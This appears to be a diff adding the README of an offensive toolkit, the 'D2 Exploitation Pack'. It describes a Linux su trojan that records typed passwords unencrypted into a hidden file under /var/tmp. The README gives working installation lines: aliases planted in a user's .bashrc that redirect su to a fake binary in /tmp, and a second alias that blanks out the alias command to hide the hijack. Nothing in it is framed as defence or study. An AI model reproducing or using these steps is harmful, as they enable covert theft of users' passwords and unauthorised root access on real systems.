@@ -1,0 +1,29 @@
+D2 Exploitation Pack
+=====================
+
+Copyright (c) 2007-2008 DSquare Security, LLC
+
+License information
+--------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Local Tool
+-----------
+
+d2sec_sutrojan is a ... su trojan horse for Linux. It simulates su
+binary and handles perfectly terminal with termios API.
+
+Passwords are saved in a file named: "/var/tmp/.zmanmi6818". This file
+is not encrypted.
+
+To install this trojan horse for example with bash, add this line in
+user's .bashrc file:
+
+alias su='if /usr/bin/test -x /tmp/su 1>/dev/null 2>&1; then /tmp/su; else su; fi; unalias su; #' 1>/dev/null 2>&1
+alias alias='#' 1>/dev/null 2>&1
+
+where /tmp/su is our su trojan horse
+
